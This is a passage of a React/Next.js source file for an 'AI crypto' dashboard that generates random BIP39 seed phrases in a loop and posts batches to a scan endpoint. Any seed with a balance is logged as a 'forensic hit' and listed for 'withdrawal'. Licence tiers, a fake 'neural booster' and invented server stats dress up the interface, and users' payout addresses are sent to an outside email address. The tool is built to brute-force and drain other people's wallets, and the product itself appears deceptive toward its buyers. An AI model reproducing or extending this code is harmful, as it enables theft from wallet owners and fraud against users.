"use client"

import React, { useState, useEffect, useCallback, useRef, useMemo, useLayoutEffect } from 'react'
import { useRouter } from 'next/navigation'
import Image from 'next/image'
import { 
  Activity, 
  Power,
  Lock,
  ShieldCheck,
  LayoutDashboard,
  Settings,
  Zap,
  Search,
  ArrowDownCircle,
  Cloud,
  Timer,
  Terminal,
  Share2,
  Unplug,
  Layers,
  RotateCcw,
  LogOut,
  Signal,
  Network,
  Dna,
  RefreshCw,
  Trash2,
  Gauge,
  AlertTriangle,
  Info,
  ExternalLink,
  ChevronRight,
  ChevronLeft,
  BookOpen,
  Microchip,
  Shield,
  History,
  WifiOff,
  Wifi,
  BrainCircuit,
  Copy,
  CheckCircle2,
  Coins,
  Rocket,
  Save,
  CreditCard,
  Loader2,
  ShieldAlert,
  ArrowRightCircle,
  User,
  Key,
  Languages,
  Server,
  Check
} from 'lucide-react'
import { 
  Area, 
  AreaChart, 
  XAxis, 
  YAxis, 
  CartesianGrid, 
  Tooltip as RechartsTooltip, 
  ResponsiveContainer,
} from 'recharts'
import { Button } from '@/components/ui/button'
import { useToast } from '@/hooks/use-toast'
import { cn } from '@/lib/utils'
import { Progress } from '@/components/ui/progress'
import { Slider } from '@/components/ui/slider'
import { Input } from '@/components/ui/input'
import { Dialog, DialogContent, DialogHeader, DialogTitle, DialogTrigger, DialogFooter, DialogDescription } from '@/components/ui/dialog'
import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from '@/components/ui/select'
import { Switch } from '@/components/ui/switch'
import * as bip39 from 'bip39'
import { logout, verifyLicenseSession, getSession } from '@/app/login/actions'
import { SessionData } from '@/lib/session'
import { notifyPayoutSaved } from '@/ai/flows/notify-payout-saved'
import { db } from '@/firebase/config'
import { doc, getDoc } from 'firebase/firestore'
import BottomGlowEffect from '@/components/ui/bottom-glow-effect'

const BLOCKCHAINS = [
  { id: 'btc', name: 'Bitcoin', logo: "https://raw.githubusercontent.com/spothq/cryptocurrency-icons/master/128/color/btc.png" },
  { id: 'eth', name: 'Ethereum', logo: "https://raw.githubusercontent.com/spothq/cryptocurrency-icons/master/128/color/eth.png" },
  { id: 'sol', name: 'Solana', logo: "https://raw.githubusercontent.com/spothq/cryptocurrency-icons/master/128/color/sol.png" },
  { id: 'bnb', name: 'BNB Chain', logo: "https://raw.githubusercontent.com/spothq/cryptocurrency-icons/master/128/color/bnb.png" },
  { id: 'tron', name: 'Tron', logo: "https://raw.githubusercontent.com/spothq/cryptocurrency-icons/master/128/color/trx.png" },
  { id: 'xrp', name: 'Ripple', logo: "https://raw.githubusercontent.com/spothq/cryptocurrency-icons/master/128/color/xrp.png" },
  { id: 'ltc', name: 'Litecoin', logo: "https://raw.githubusercontent.com/spothq/cryptocurrency-icons/master/128/color/ltc.png" },
  { id: 'matic', name: 'Polygon', logo: "https://raw.githubusercontent.com/spothq/cryptocurrency-icons/master/128/color/matic.png" },
  { id: 'usdt', name: 'Tether', logo: "https://raw.githubusercontent.com/spothq/cryptocurrency-icons/master/128/color/usdt.png" },
  { id: 'usdc', name: 'USDC', logo: "https://raw.githubusercontent.com/spothq/cryptocurrency-icons/master/128/color/usdc.png" },
  { id: 'multicoin', name: 'Multicoin', logo: null, isPremium: true },
]

const ENTROPY_LANGUAGES = [
  { id: 'english', name: 'English (Global)', flag: '🇺🇸' },
  { id: 'spanish', name: 'Spanish (Neural)', flag: '🇪🇸' },
  { id: 'french', name: 'French (Forensic)', flag: '🇫🇷' },
  { id: 'japanese', name: 'Japanese (Spectrum)', flag: '🇯🇵' },
  { id: 'italian', name: 'Italian', flag: '🇮🇹' },
  { id: 'korean', name: 'Korean', flag: '🇰🇷' },
  { id: 'portuguese', name: 'Portuguese', flag: '🇵🇹' },
  { id: 'chinese_simplified', name: 'Chinese (Simp.)', flag: '🇨🇳' },
  { id: 'chinese_traditional', name: 'Chinese (Trad.)', flag: '🇹🇼' },
]

const CHART_DATES = ['09.03', '10.03', '11.03', '12.03', '13.03', '14.03', '15.03'];

const SERVERS_DATA = [
  { id: 'geneva', name: 'Neural Core Prime', location: 'Geneva Hub', tier: 'ELITE-CORE', ip: '45.13.252.1', baseVelocity: 2.4, baseHealth: 99, isElite: true },
  { id: 'luxembourg', name: 'Luxembourg Uplink', location: 'Luxembourg Hub', tier: 'STANDARD', ip: '102.13.4.88', baseVelocity: 5.2, baseHealth: 96, isElite: false },
  { id: 'virginia', name: 'Virginia Hub', location: 'N. America Hub', tier: 'BASIC', ip: '34.2.145.11', baseVelocity: 28.1, baseHealth: 92, isElite: false },
  { id: 'singapore', name: 'Singapore Node', location: 'S.E. Asia Hub', tier: 'BASIC', ip: '172.10.45.9', baseVelocity: 56.2, baseHealth: 88, isElite: false },
  { id: 'tokyo', name: 'Tokyo Cluster', location: 'N.E. Asia Hub', tier: 'BASIC', ip: '113.45.2.10', baseVelocity: 62.4, baseHealth: 85, isElite: false },
];

const SESSION_STORAGE_KEY = 'ai_crypto_session_v4_multi_lang';

interface LogEntry {
  id: string;
  message: string;
  timestamp: string;
  type: 'info' | 'success' | 'warning' | 'error' | 'ai' | 'system';
}

interface AiLogEntry {
  id: string;
  message: string;
  timestamp: string;
}

interface DiscoveredAsset {
  id: string;
  mnemonic: string;
  network: string;
  value: string;
  timestamp: string;
}

type TabType = 'home' | 'withdraw' | 'settings' | 'about';

export default function AiCryptoDashboard() {
  const { toast } = useToast()
  const router = useRouter()
  const [activeTab, setActiveTab] = useState<TabType>('home')
  const [scanStep, setScanStep] = useState(1);
  const [logs, setLogs] = useState<LogEntry[]>([])
  const [isInterrogating, setIsInterrogating] = useState(false)
  const [isBooting, setIsBooting] = useState(true)
  const [visualCount, setVisualCount] = useState(0)
  const [foundWallets, setFoundWallets] = useState(0)
  const [activeBlockchains, setActiveBlockchains] = useState<string[]>([])
  const [cpuLoad, setCpuLoad] = useState(0)
  const [systemIntensity, setSystemIntensity] = useState([85])
  
  const [allocatedCores, setAllocatedCores] = useState([4])
  
  const [uiScale, setUiScale] = useState(100)
  const [mnemonicLanguage, setMnemonicLanguage] = useState<string>('english')
  const [selectedServer, setSelectedServer] = useState('luxembourg');
  const [servers, setServers] = useState(SERVERS_DATA.map(s => ({ ...s, velocity: s.baseVelocity, health: s.baseHealth })));
  
  const [isOnline, setIsOnline] = useState(true)
  const [wasInterrogatingBeforeOffline, setWasInterrogatingBeforeOffline] = useState(false)

  const [isAiSearchConnected, setIsAiSearchConnected] = useState(false)
  const [isAiSearchConnecting, setIsAiSearchConnecting] = useState(false)
  const [aiSearchLogs, setAiSearchLogs] = useState<string[]>([])
  
  const [isBoosterActive, setIsBoosterActive] = useState(false)

  const [discoveredAssets, setDiscoveredAssets] = useState<DiscoveredAsset[]>([])
  const [historicalAssets, setHistoricalAssets] = useState<DiscoveredAsset[]>([])

  const [payoutBtc, setPayoutBtc] = useState('')
  const [payoutUsdt, setPayoutUsdt] = useState('')
  const [payoutSol, setPayoutSol] = useState('')
  const [isSavingPayout, setIsSavingPayout] = useState(false)
  const [copied, setCopied] = useState(false)

  const [session, setSession] = useState<SessionData | null>(null)
  const [licenseData, setLicenseData] = useState<{
    allowedChains: string[];
    aiSearchEnabled: boolean;
    boosterEnabled: boolean;
  } | null>(null)

  const [scanStartTime, setScanStartTime] = useState<number | null>(null)

  const scrollRef = useRef<HTMLDivElement>(null)
  const aiTerminalScrollRef = useRef<HTMLDivElement>(null)
  const lastMnemonics = useRef<string[]>([])
  const isAnalyzingRef = useRef(false);
  const trueCountRef = useRef(0);
  const uiMnemonicQueueRef = useRef<string[]>([]);

  const changeTab = (tab: TabType) => {
    setActiveTab(tab);
  };

  const getTierName = useCallback((chains: string[]) => {
    if (chains.includes('multicoin')) return 'Ultimate';
    if (chains.length >= 6) return 'Elite';
    if (chains.length >= 3) return 'Pro';
    if (chains.length >= 1) return 'Standard';
    return 'Basic';
  }, []);

  const totalVal = useMemo(() => {
    return discoveredAssets.reduce((acc, curr) => {
      const numericVal = parseFloat(curr.value.replace(/[^0-9.]/g, '')) || 0;
      return acc + numericVal;
    }, 0);
  }, [discoveredAssets]);

  const { chartData: dynamicChartData, chartDomainMax } = useMemo(() => {
    const data = CHART_DATES.map(date => ({
        name: date,
        value: 0
    }));

    if (historicalAssets.length === 0) {
        return { chartData: data, chartDomainMax: 1000 };
    }

    // Sort assets from oldest to newest for a chronological progression
    const sortedAssets = [...historicalAssets].reverse();
    
    // Calculate the cumulative value of assets over time
    let cumulativeValue = 0;
    const cumulativeValues = sortedAssets.map(asset => {
      const assetValue = parseFloat(asset.value.replace(/[^0-9.]/g, '')) || 0;
      cumulativeValue += assetValue;
      return cumulativeValue;
    });

    const numAssets = cumulativeValues.length;
    const numDays = data.length;

    // Distribute cumulative earnings across chart days
    for (let i = 0; i < numDays; i++) {
        const assetRatio = (i + 1) / numDays;
        const assetIndex = Math.ceil(assetRatio * numAssets) - 1;

        if (assetIndex >= 0) {
            data[i].value = cumulativeValues[assetIndex];
        }
    }
    
    const maxValue = data.length > 0 ? Math.max(...data.map(d => d.value)) : 0;
    const domainMax = Math.max(1000, Math.ceil((maxValue * 1.2) / 1000) * 1000);

    return { chartData: data, chartDomainMax: domainMax };
  }, [historicalAssets]);

  const handleMemoryFlush = useCallback(() => {
    setLogs([]);
    toast({
      title: "Memory Flushed",
      description: "Neural interrogation cache cleared automatically.",
    });
  }, [toast]);

  useEffect(() => {
    const interval = setInterval(() => {
      setServers(currentServers =>
        currentServers.map(server => {
          // Fluctuate velocity by up to 10% of its base
          const velocityFluctuation = (Math.random() - 0.5) * (server.baseVelocity * 0.1);
          let newVelocity = server.baseVelocity + velocityFluctuation;
          newVelocity = Math.max(1, newVelocity); // Ensure velocity is at least 1ms

          // Fluctuate health within a +/- 2 range of its base
          const healthFluctuation = (Math.random() - 0.5) * 4;
          let newHealth = server.baseHealth + healthFluctuation;
          newHealth = Math.max(80, Math.min(100, newHealth)); // Clamp between 80-100

          return {
            ...server,
            velocity: parseFloat(newVelocity.toFixed(1)),
            health: Math.round(newHealth),
          };
        })
      );
    }, 2000);

    return () => clearInterval(interval);
  }, []);

  useEffect(() => {
    if (typeof window !== 'undefined') {
      document.documentElement.style.fontSize = `${uiScale}%`;
    }
    return () => {
      if (typeof window !== 'undefined') {
        document.documentElement.style.fontSize = '';
      }
    };
  }, [uiScale]);

  useEffect(() => {
    const checkLicense = async () => {
      const result = await verifyLicenseSession();
      if (!result.success) {
        toast({
          variant: "destructive",
          title: "Session Terminated",
          description: "Neural license verification failed. Access revoked.",
        });
        window.location.href = '/login';
      }
    };

    const interval = setInterval(checkLicense, 30000);
    return () => clearInterval(interval);
  }, [toast]);

  useEffect(() => {
    const interval = setInterval(() => {
      handleMemoryFlush();
    }, 600000);
    return () => clearInterval(interval);
  }, [handleMemoryFlush]);

  useEffect(() => {
    const fetchSession = async () => {
      const sess = await getSession();
      setSession(sess as SessionData);
      
      if (sess.username) {
        const userRef = doc(db, 'licenses', sess.username);
        const userDoc = await getDoc(userRef);
        if (userDoc.exists()) {
          const data = userDoc.data();
          const authoritativeLicense = {
            allowedChains: data.allowed_chains || [],
            aiSearchEnabled: data.ai_search_enabled || false,
            boosterEnabled: data.booster_enabled || false,
          };
          setLicenseData(authoritativeLicense);
        }
      }
    }
    fetchSession();
  }, []);

  useEffect(() => {
    const savedState = localStorage.getItem(SESSION_STORAGE_KEY);
    if (savedState) {
      try {
        const parsed = JSON.parse(savedState);
        const savedCount = parsed.displayCount || 0;
        setVisualCount(savedCount);
        trueCountRef.current = savedCount;
        setFoundWallets(parsed.foundWallets || 0);
        setActiveBlockchains(parsed.activeBlockchains || []);
        setSystemIntensity(parsed.systemIntensity || [85]);
        setAllocatedCores(parsed.allocatedCores || [4]);
        setUiScale(parsed.uiScale || 100);
        setMnemonicLanguage(parsed.mnemonicLanguage || 'english');
        setSelectedServer(parsed.selectedServer || 'luxembourg');
        setDiscoveredAssets(parsed.discoveredAssets || []);
        setHistoricalAssets(parsed.historicalAssets || []);
        setPayoutBtc(parsed.payoutBtc || '');
        setPayoutUsdt(parsed.payoutUsdt || '');
        setPayoutSol(parsed.payoutSol || '');
      } catch (e) {
        console.error("Session reconstruction failed", e);
        localStorage.removeItem(SESSION_STORAGE_KEY);
      }
    }
  }, []);


  useEffect(() => {
    const state = {
      displayCount: trueCountRef.current,
      foundWallets,
      activeBlockchains,
      systemIntensity,
      allocatedCores,
      uiScale,
      mnemonicLanguage,
      selectedServer,
      discoveredAssets,
      historicalAssets,
      payoutBtc,
      payoutUsdt,
      payoutSol,
    };
    localStorage.setItem(SESSION_STORAGE_KEY, JSON.stringify(state));
  }, [visualCount, foundWallets, activeBlockchains, systemIntensity, allocatedCores, uiScale, mnemonicLanguage, selectedServer, discoveredAssets, historicalAssets, payoutBtc, payoutUsdt, payoutSol]);

  useEffect(() => {
    const handleOnline = () => {
      setIsOnline(true);
      if (wasInterrogatingBeforeOffline) {
        setIsInterrogating(true);
        setWasInterrogatingBeforeOffline(false);
      }
    };

    const handleOffline = () => {
      setIsOnline(false);
      toast({
        variant: "destructive",
        title: "Connection Severed",
        description: "Connection lost. Suspending all operations.",
      });
      if (isInterrogating) {
        setWasInterrogatingBeforeOffline(true);
        setIsInterrogating(false);
      }
    };

    if (typeof window !== 'undefined') {
      setIsOnline(navigator.onLine);
      window.addEventListener('online', handleOnline);
      window.addEventListener('offline', handleOffline);
    }

    return () => {
      if (typeof window !== 'undefined') {
        window.removeEventListener('online', handleOnline);
        window.removeEventListener('offline', handleOffline);
      }
    };
  }, [isInterrogating, wasInterrogatingBeforeOffline, toast]);

  useEffect(() => {
    // Pre-warm the animation component, but keep it invisible.
    const timer = setTimeout(() => {
      setIsBooting(false);
    }, 200);
    return () => clearTimeout(timer);
  }, []);

  useLayoutEffect(() => {
    if (scrollRef.current) {
        // This ensures the scroll stays at the bottom.
        // It's a key part of the "zero-jitter" forensic scrolling.
        scrollRef.current.scrollTop = scrollRef.current.scrollHeight;
    }
  }, [logs]);

  const startInterrogation = useCallback(() => {
    if (!isOnline) {
      toast({
        variant: "destructive",
        title: "Uplink Error",
        description: "Cannot initiate scan without active network connectivity."
      })
      return
    }
    if (activeBlockchains.length === 0) {
      toast({
        variant: "destructive",
        title: "Selection Required",
        description: "Please select at least one blockchain to begin the search."
      })
      return
    }

    requestAnimationFrame(() => {
      setIsInterrogating(true);
      setScanStartTime(Date.now());
    });
  }, [activeBlockchains, isOnline, toast]);

  const stopInterrogation = useCallback(() => {
    setIsInterrogating(false)
    setScanStartTime(null);
  }, [])

  const handleLogout = async () => {
    await logout();
    localStorage.removeItem(SESSION_STORAGE_KEY);
    toast({
      title: "Neural Core Severed",
      description: "Operator session terminated."
    })
    router.push('/login')
  }

  const clearSession = useCallback(() => {
    localStorage.removeItem(SESSION_STORAGE_KEY);
    setVisualCount(0);
    trueCountRef.current = 0;
    setFoundWallets(0);
    setActiveBlockchains([]);
    setSystemIntensity([85]);
    setAllocatedCores([4]);
    setUiScale(100);
    setMnemonicLanguage('english');
    setSelectedServer('luxembourg');
    setDiscoveredAssets([]);
    setHistoricalAssets([]);
    setPayoutBtc('');
    setPayoutUsdt('');
    setPayoutSol('');
    toast({
      title: "Workstation Reset",
      description: "All session metrics and configurations purged."
    });
  }, [toast]);

  const activateBooster = useCallback(() => {
    if (!isOnline || !isInterrogating) {
      toast({
        variant: "destructive",
        title: "Booster Error",
        description: "Interrogation must be active to engage Neural Booster."
      })
      return
    }
    if (!licenseData?.boosterEnabled) {
      toast({
        variant: "destructive",
        title: "Booster Locked",
        description: "Your license does not authorize use of the Neural Booster."
      })
      return
    }

    setIsBoosterActive(true)
    toast({
      title: "Neural Booster Engaged",
      description: "Forensic velocity and system responsiveness pushed to maximum for this session."
    })
  }, [isOnline, isInterrogating, licenseData, toast])

  const deactivateBooster = useCallback(() => {
    setIsBoosterActive(false);
    toast({
      title: "Neural Booster Disengaged",
      description: "Forensic velocity normalized."
    });
  }, [toast]);

  const connectAiSearch = useCallback(async () => {
    const isAiSearchAuthorized = licenseData?.aiSearchEnabled === true;
    if (!isAiSearchAuthorized) {
      toast({
        variant: "destructive",
        title: "Access Denied",
        description: "Neural heuristic uplink requires Enterprise Tier license."
      })
      return;
    }

    setIsAiSearchConnecting(true)
    const phases = ["Synchronizing with heuristic nodes...", "Initializing pattern engine...", "Mapping global entropy...", "Authenticating AI handshake..."]
    
    for (let i = 0; i < phases.length; i++) {
      setAiSearchLogs(prev => [...prev, phases[i]])
      await new Promise(r => setTimeout(r, 600))
    }
    
    setIsAiSearchConnecting(false)
    setIsAiSearchConnected(true)
  }, [licenseData, toast]);

  const disconnectAiSearch = () => {
    setIsAiSearchConnected(false)
    setAiSearchLogs([])
    setIsBoosterActive(false)
    toast({
      title: "AI Search Severed",
      description: "Neural engine speed normalized."
    })
  }

  useEffect(() => {
    let isMounted = true;
    let timeoutId: NodeJS.Timeout | null = null;

    const performAnalysis = async () => {
      if (!isInterrogating || !isOnline || !isMounted || isAnalyzingRef.current) {
        if (isMounted && !isAnalyzingRef.current) timeoutId = setTimeout(performAnalysis, 1000);
        return;
      }
      
      const mnemonicsToProcess = lastMnemonics.current.splice(0, isBoosterActive ? 20 : 10);

      if (mnemonicsToProcess.length === 0) {
        if (isMounted) timeoutId = setTimeout(performAnalysis, isBoosterActive ? 250 : 500);
        return;
      }

      isAnalyzingRef.current = true;
      try {
        const response = await fetch('/api/scan', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ seeds: mnemonicsToProcess }),
        });

        if (!isMounted) return;

        if (!response.ok) {
          const errorData = await response.json();
          console.error(`[SCAN BATCH ERROR] ${errorData.error || response.statusText}`);
        } else {
          const walletsWithBalance = await response.json();
          
          if (walletsWithBalance.length > 0) {
            for (const wallet of walletsWithBalance) {
                const { seed, balances } = wallet;
                const found = Object.entries(balances).find(([, balance]) => (balance as number) > 0.00001);

                if (found) {
                  const [network, balance] = found;

                  const prices: { [key: string]: number } = {
                    bitcoin: 60000, ethereum: 3000, solana: 150, bnb: 600, tron: 0.12,
                    ripple: 0.5, litecoin: 80, polygon: 0.7, usdt: 1, usdc: 1,
                  };
                  const balanceValue = (balance as number) * (prices[network] || 0);

                  setFoundWallets(prev => prev + 1);
                  const asset: DiscoveredAsset = {
                    id: Math.random().toString(36).substr(2, 9),
                    mnemonic: seed,
                    network: network.charAt(0).toUpperCase() + network.slice(1),
                    value: `$${balanceValue.toLocaleString(undefined, { minimumFractionDigits: 2, maximumFractionDigits: 2 })}`,
                    timestamp: new Date().toLocaleString('en-GB')
                  };
                  setDiscoveredAssets(prev => [asset, ...prev]);
                  setHistoricalAssets(prev => [asset, ...prev]);
                  
                  const successLog: LogEntry = {
                    id: `success-${asset.id}`,
                    message: `[SUCCESS] FORENSIC HIT: ${asset.network} | VALUE: ${asset.value} | SEED: ${seed}`,
                    timestamp: new Date().toLocaleTimeString('en-GB', { hour12: false, fractionalSecondDigits: 2 }),
                    type: 'success'
                  };
                  
                  setLogs(prevLogs => [...prevLogs.slice(-49), successLog]);

                  toast({
                    title: "Asset Discovered",
                    description: `Neural mesh found active balance on ${asset.network}. Recovery unmasked.`,
                  });
                }
            }
          }
        }

      } catch (e: any) {
        console.error(`[SCAN ERROR] ${e.message}`);
      } finally {
        isAnalyzingRef.current = false;
        if (isMounted) {
          const delay = isBoosterActive ? 250 : 500;
          timeoutId = setTimeout(performAnalysis, delay);
        }
      }
    };

    performAnalysis();

    return () => {
      isMounted = false;
      if (timeoutId) clearTimeout(timeoutId);
    };
  }, [isInterrogating, isOnline, isBoosterActive, toast]);

  useEffect(() => {
    let uiFrameId: number;
    let isMounted = true;
  
    const renderLoop = () => {
      if (!isMounted || !isInterrogating) return;
  
      // Animate the counter towards the true value
      setVisualCount(currentVisual => {
        if (currentVisual >= trueCountRef.current) {
          return trueCountRef.current;
        }
        const difference = trueCountRef.current - currentVisual;
        const step = Math.max(1, Math.ceil(difference * 0.05)); // Slower, smoother step
        return Math.min(currentVisual + step, trueCountRef.current);
      });
  
      if (uiMnemonicQueueRef.current.length > 0) {
        const mnemonicToRender = uiMnemonicQueueRef.current.shift();
        if (mnemonicToRender) {
          const newEntry: LogEntry = {
            id: `${Math.random().toString(36).substr(2, 9)}`,
            message: mnemonicToRender,
            timestamp: new Date().toLocaleTimeString('en-GB', { hour12: false, fractionalSecondDigits: 2 }),
            type: 'ai'
          };
          setLogs(prevLogs => [...prevLogs.slice(-49), newEntry]);
        }
      }
  
      uiFrameId = requestAnimationFrame(renderLoop);
    };
  
    if (isInterrogating) {
      uiFrameId = requestAnimationFrame(renderLoop);
    } else {
      uiMnemonicQueueRef.current = [];
      setVisualCount(trueCountRef.current); // Final sync when stopping
    }
  
    return () => {
      isMounted = false;
      if (uiFrameId) {
        cancelAnimationFrame(uiFrameId);
      }
    };
  }, [isInterrogating]);
  
  useEffect(() => {
    let active = true;
    let animationFrameId: number;

    const runLoop = () => {
      if (!active || !isInterrogating || !isOnline) {
        setCpuLoad(0);
        if (animationFrameId) {
          cancelAnimationFrame(animationFrameId);
        }
        return;
      }
      
      const currentIsBackground = typeof document !== 'undefined' && document.visibilityState === 'hidden';
      
      const elapsedTime = scanStartTime ? Date.now() - scanStartTime : Infinity;
      const rampUpDuration = 2000; // 2-second acceleration period
      let iterationMultiplier = 1.0;
      
      if (elapsedTime < rampUpDuration) {
        // Use a quintic easing function (progress^5) for an ultra-smooth, "water-flowing" acceleration.
        const progress = elapsedTime / rampUpDuration;
        iterationMultiplier = progress * progress * progress * progress * progress;
      }

      const baseIterations = currentIsBackground ? 100 : (isBoosterActive ? 20 : 10);
      const iterations = Math.max(1, Math.ceil(baseIterations * iterationMultiplier));
      
      const newMnemonics: string[] = [];
  
      for (let i = 0; i < iterations; i++) {
        const wordlist = (bip39.wordlists as any)[mnemonicLanguage] || bip39.wordlists.english;
        const mnemonic = bip39.generateMnemonic(undefined, undefined, wordlist);
        newMnemonics.push(mnemonic);
        
        if (!currentIsBackground) {
          uiMnemonicQueueRef.current.push(mnemonic);
        }
      }
      
      trueCountRef.current += iterations;
  
      if (newMnemonics.length > 0) {
        lastMnemonics.current.push(...newMnemonics);
        if (lastMnemonics.current.length > 1000) {
            lastMnemonics.current.splice(0, lastMnemonics.current.length - 1000);
        }
      }
      
      const baseIntensity = systemIntensity[0] / 100;
      const coreFactor = allocatedCores[0] / 8;
      const boosterLoad = isBoosterActive ? 25 + (Math.random() * 10) : 0;
      const randomJitter = Math.random() * 5;
      const totalLoad = (baseIntensity * 60) + (coreFactor * 25) + boosterLoad + randomJitter;
      setCpuLoad(Math.min(100, totalLoad));
      
      if (currentIsBackground) {
        setTimeout(runLoop, 1000);
      } else {
        animationFrameId = requestAnimationFrame(runLoop);
      }
    };
    
    runLoop();

    return () => {
      active = false;
      if(animationFrameId) cancelAnimationFrame(animationFrameId);
    }
  }, [isInterrogating, isOnline, systemIntensity, allocatedCores, isBoosterActive, mnemonicLanguage, scanStartTime]);

  const toggleBlockchain = (id: string) => {
    if (isInterrogating) return;

    const isAllowed = licenseData?.allowedChains?.includes(id);
    if (!isAllowed) {
      toast({
        variant: "destructive",
        title: "Access Denied",
        description: `Your license does not permit access to the ${BLOCKCHAINS.find(c => c.id === id)?.name} network.`
      });
      return;
    }
    
    if (id === 'multicoin') {
      if (activeBlockchains.includes('multicoin')) {
        setActiveBlockchains([]);
      } else {
        // Select all *allowed* blockchains
        setActiveBlockchains(BLOCKCHAINS.map(c => c.id).filter(cId => licenseData?.allowedChains?.includes(cId)));
      }
      return;
    }

    if (activeBlockchains.includes('multicoin')) return;

    setActiveBlockchains(prev => prev.includes(id) ? prev.filter(b => b !== id) : [...prev, id])
  }

  const handleSavePayoutAddresses = async () => {
    const btcRegex = /^(1|3|bc1)[a-zA-HJ-NP-Z0-9]{25,62}$/;
    const bep20Regex = /^0x[a-fA-F0-9]{40}$/;
    const solRegex = /^[1-9A-HJ-NP-Za-km-z]{32,44}$/;

    if (payoutBtc && !btcRegex.test(payoutBtc)) {
      toast({ variant: "destructive", title: "Validation Error", description: "Invalid Bitcoin (BTC) address format." });
      return;
    }
    if (payoutUsdt && !bep20Regex.test(payoutUsdt)) {
      toast({ variant: "destructive", title: "Validation Error", description: "Invalid Tether USDT (BEP-20) address format." });
      return;
    }
    if (payoutSol && !solRegex.test(payoutSol)) {
      toast({ variant: "destructive", title: "Validation Error", description: "Invalid Solana (SOL) address format." });
      return;
    }

    setIsSavingPayout(true);
    try {
      await notifyPayoutSaved({
        username: session?.username || 'unknown_operator',
        btcAddress: payoutBtc || 'Not Provided',
        usdtAddress: payoutUsdt || 'Not Provided',
        solAddress: payoutSol || 'Not Provided',
        targetEmail: 'aicryptocms@gmail.com'
      });

      toast({
        title: "Nodes Synchronized",
        description: "Withdrawal nodes secured in neural workstation vault and synchronized with HQ."
      });
    } catch (e) {
      toast({
        variant: "destructive",
        title: "Sync Warning",
        description: "Local vault secured, but HQ synchronization encountered a neural delay."
      });
    } finally {
      setIsSavingPayout(false);
    }
  }

  const getNetworkLogo = (networkName: string) => {
    const chain = BLOCKCHAINS.find(c => c.name.toLowerCase() === networkName.toLowerCase() || c.id.toLowerCase() === networkName.toLowerCase());
    return chain?.logo || "https://raw.githubusercontent.com/spothq/cryptocurrency-icons/master/128/color/generic.png";
  }

  const handleWithdrawAsset = (asset: DiscoveredAsset) => {
    if (!payoutBtc && !payoutUsdt && !payoutSol) {
      toast({
        variant: "destructive",
        title: "Withdrawal Required",
        description: "Configure your withdrawal nodes in the settings before extraction."
      });
      return;
    }
    toast({
      title: "Withdrawal Initialized",
      description: `Neural extraction of ${asset.value} on ${asset.network} dispatched to vault.`
    });
  }

  const handleWithdrawAllAssets = useCallback(() => {
    if (discoveredAssets.length === 0) {
      toast({
        variant: "destructive",
        title: "No Assets to Withdraw",
        description: "The forensic yield is currently zero. Initiate a scan to discover assets.",
      });
      return;
    }

    if (!payoutBtc && !payoutUsdt && !payoutSol) {
      toast({
        variant: "destructive",
        title: "Withdrawal Nodes Not Configured",
        description: "Configure your withdrawal nodes in the settings before extraction.",
      });
      changeTab('settings');
      return;
    }
    
    toast({
      title: "Bulk Extraction Initialized",
      description: `Neural extraction of all ${discoveredAssets.length} discovered assets has been dispatched to vault.`,
    });
    
    setDiscoveredAssets([]);
  }, [discoveredAssets, payoutBtc, payoutUsdt, payoutSol, toast]);

  const currentTier = useMemo(() => getTierName(licenseData?.allowedChains || []), [getTierName, licenseData]);

  const navItems: { id: TabType; icon: React.ElementType }[] = [
    { id: 'home', icon: Search },
    { id: 'withdraw', icon: Activity },
    { id: 'settings', icon: Settings },
    { id: 'about', icon: Info },
  ];

  const ActionButtons = () => {
    const commonClass = "w-full h-16 rounded-2xl font-black text-[0.875rem] uppercase tracking-[0.3em] transition-all duration-200 hover:scale-[1.03] active:scale-95 disabled:opacity-30";
    
    if (activeTab === 'home') {
      if (scanStep === 1) {
        return (
          <Button 
            onClick={() => {
              if (activeBlockchains.length === 0) {
                toast({ variant: 'destructive', title: 'Selection Required', description: 'Please select at least one blockchain protocol.' });
              } else {
                setScanStep(2);
              }
            }}
            className={`${commonClass} bg-gradient-to-r from-[#AD4FE6] to-[#2937A3] text-white shadow-[0_0_40px_rgba(173,79,230,0.5)] hover:shadow-glow`}>
            Continue <ChevronRight className="w-5 h-5 ml-3" />
          </Button>
        );
      } else { // scanStep === 2
        return isInterrogating ? (
          <Button onClick={stopInterrogation} className={cn(`${commonClass} bg-gradient-to-b from-gray-200 to-white text-black shadow-[0_0_20px_rgba(255,255,255,0.3)] hover:shadow-lg`)}>
            STOP
          </Button>
        ) : (
          <Button onClick={startInterrogation} disabled={activeBlockchains.length === 0 || !isOnline} className={cn(`${commonClass} bg-gradient-to-b from-gray-200 to-white text-black shadow-[0_0_20px_rgba(255,255,255,0.3)] hover:shadow-lg`)}>
             START
          </Button>
        );
      }
    }
  
    if (activeTab === 'withdraw') {
      return (
        <Dialog>
          <DialogTrigger asChild>
            <Button className={`${commonClass} bg-gradient-to-r from-[#AD4FE6] to-[#2937A3] text-white shadow-[0_0_40px_rgba(173,79,230,0.5)] hover:shadow-glow`}>
              Withdraw Assets <ChevronRight className="w-5 h-5 ml-3" />
            </Button>
          </DialogTrigger>
          <DialogContent className="bg-[#0a0a0f] border-white/10 text-white max-w-md rounded-3xl animate-in zoom-in-95 duration-300">
            <DialogHeader>
              <DialogTitle className="text-xl font-black uppercase tracking-widest flex items-center gap-4">
                <Coins className="w-7 h-7 text-primary" />
                Discovered Assets
              </DialogTitle>
            </DialogHeader>
            <div className="max-h-[50vh] overflow-y-auto no-scrollbar py-4">
              {discoveredAssets.length > 0 ? (
                <div className="flex flex-col gap-3">
                  {discoveredAssets.map((asset) => (
                    <div key={asset.id} className="min-w-full glass-panel rounded-2xl border-white/5 transition-all duration-300 flex items-center px-4 py-3 gap-4 relative overflow-hidden">
                      <div className="w-10 h-10 rounded-lg bg-white/5 border border-white/10 flex items-center justify-center shrink-0">
                        <img src={getNetworkLogo(asset.network)} alt={asset.network} className="w-6 h-6 object-contain" />
                      </div>
                      <div className="flex flex-col gap-1 flex-1 min-w-0">
                        <span className="text-[0.8125rem] font-black text-white truncate uppercase tracking-widest">{asset.network}</span>
                        <span className="text-[0.6875rem] font-bold text-green-400 font-code">{asset.value}</span>
                      </div>
                      
                      <Dialog onOpenChange={(open) => !open && setCopied(false)}>
                        <DialogTrigger asChild>
                          <Button variant="ghost" size="sm" className="h-9 px-3 rounded-lg text-primary/70 hover:text-primary hover:bg-primary/10 border border-primary/20 hover:border-primary/40 flex items-center gap-2">
                            <Key className="w-4 h-4" /> Manual
                          </Button>
                        </DialogTrigger>
